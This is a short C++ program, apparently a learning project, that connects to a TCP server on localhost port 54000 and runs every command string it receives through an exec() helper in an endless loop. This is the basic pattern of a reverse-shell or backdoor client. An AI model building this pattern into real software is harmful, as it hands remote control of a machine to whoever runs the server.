#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"

int main()
{
	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
	conn->start_connection();
	while (true)
	{
		// recv command from server
		char* commandLine = conn->recv_data();
		std::cout << commandLine << std::endl;
		std::string output = exec(std::string(commandLine));
		std::cout << output << std::endl;
		delete[] commandLine;
		// run command

	}
	return 0;
}
